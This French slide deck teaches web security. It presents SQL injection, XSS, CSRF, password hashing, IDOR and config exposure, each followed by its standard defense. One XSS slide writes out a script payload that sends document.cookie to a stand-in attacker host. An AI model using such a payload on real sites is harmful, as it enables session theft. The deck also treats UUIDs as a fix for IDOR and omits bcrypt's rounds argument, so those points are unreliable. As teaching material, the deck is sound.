---
title: Sécurité Web
theme: slidev-theme-javascript
addons:
  - slidev-addon-javascript
layout: cover
defaults:
  layout: center
---

# Sécurité Web

Don't trust everyone

---

# La règle d'or

**"Ne jamais faire confiance à l'utilisateur."**

- Tout ce qui vient de l'extérieur est **hostile** par défaut :
  - Formulaires (inputs)
  - URLs (query params)
  - Headers HTTP
  - LocalStorage / Cookies

---

| Action           | Rôle                          | Exemple                         |
| ---------------- | ----------------------------- | ------------------------------- |
| **Validation**   | Rejeter ce qui est invalide   | "Ceci n'est pas un email"       |
| **Sanitization** | Nettoyer ce qui est dangereux | Retirer `<script>` d'une chaîne |

---

# Injection SQL

```javascript {monaco} {height:'auto'}
const query = `SELECT * FROM users WHERE id = ${req.query.id}`;
```

---
layout: question
---

Et si l'id est : "1 OR 1=1" ?

---

# Injection SQL: La solution

Les requêtes préparées

```javascript {monaco} {height:'auto'}
db.execute("SELECT * FROM users WHERE id = ?", [req.query.id]);
```

---

# XSS (Cross-Site Scripting)

```javascript {monaco} {height:'auto'}
const comment = user.getComment();
document.getElementById("display").innerHTML = comment;
```

---
layout: question
---

Et si le commentaire est 

`<script>fetch("https://hacker.com/?steal=" + document.cookie)</script>` 

?

---

# XSS: La solution

- Utiliser `.textContent` au lieu de `.innerHTML`
- Utiliser des bibliothèques de sanitization

---

# CSRF (Cross-Site Request Forgery)

### Le scénario

1. Vous êtes connecté à `votre-banque.com`.
2. Vous visitez `site-malveillant.com`.
3. Le site malveillant contient un formulaire caché qui envoie une requête `POST` vers `votre-banque.com/transfert`.

---

# CSRF: La solution

- Utiliser des **Tokens CSRF** (jetons uniques par session).
- Configurer les cookies en `SameSite: Strict` ou `Lax`.

---

# Le stockage des mots de passe

**Ne jamais stocker un mot de passe en clair.**

* Le mauvais réflexe

```javascript
db.users.save({ user: "Julien", pass: "123456" });
```

* La solution: Le Hachage (Bcrypt)

```javascript
import bcrypt from "bcrypt";
 
const password = "mon_super_password";

const hash = await bcrypt.hash(password);
// On ne stocke que le hash
// Un hash est une empreinte **irréversible**.
```

---
layout: question
---

Et si on créer une raibow table ?

---

# Raibow table: la solution

**Le salage**: On ajoute une chaine aléatoire en début du mot de passe.

- Sans sel : Deux utilisateurs avec le même mot de passe ont le même hash.
- Avec sel : On ajoute une chaîne aléatoire avant de hacher.

➡️ Rend les **Rainbow Tables** inutilisables.

---

# Insecure Direct Object Reference

``` 
https://mon-api.com/user/42
```

---

# Insecure Direct Object Reference: la solution

Les UUID

```javascript
// Au lieu de "42", on utilise :
"550e8400-e29b-41d4-a716-446655440000";
```

---

# Fingerprinting

```http 
X-Powered-By: Express
Access-Control-Allow-Origin: *
Server: Microsoft-IIS/10.0
```

---

# Exposer ses fichiers de conf (.env)

* **.gitignore** : Ne JAMAIS commit ton `.env`.
* **Permissions** : Ton serveur web ne doit servir que le dossier `/public` ou `/dist`.
* **Vaults** : Utiliser des gestionnaires de secrets.

---

# Checklist de survie

- ✅ **HTTPS** partout.
- ✅ Headers de sécurité (**Helmet.js** en Node).
- ✅ Limiter le taux de requêtes (**Rate Limiting**).
- ✅ Dépendances à jour (`npm audit`).
- ✅ **Principe du moindre privilège** 
  - la DB n'a pas besoin d'être admin
  - l'app n'a pas besoin d'être exécutée en root
